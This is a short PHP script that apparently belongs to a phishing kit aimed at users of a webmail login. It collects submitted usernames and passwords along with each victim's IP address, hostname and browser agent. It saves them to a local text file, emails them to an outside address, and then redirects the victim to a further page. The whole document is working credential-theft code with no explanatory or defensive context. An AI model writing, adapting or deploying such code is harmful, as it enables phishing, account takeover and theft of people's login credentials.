<?php
session_start();
ob_start();

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];
$username =  $_POST['_fm.l._0.a'];


//Getting UserID info from Session
$_SESSION['username'] = $username =  $_POST['userid'];
$_SESSION['password'] = $password =  $_POST['pass'];



$jayd="==================+[ User Info - LION ]+==================
Email: $username
Password   : $password
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

$fp = fopen('ahmed.txt','a');
$savestring = $jayd."\n";
fwrite($fp, $savestring);
fclose($fp);

$recipient="cho_gwin@163.com";
$subject ="WELCOME LOGZ MXHICHINA"."\n";
$headers = "From: JAY";

$Redirect="alimailX.php";


if(mail($recipient,$subject,$jayd,$headers)){
header("Location: $Redirect");
}


?>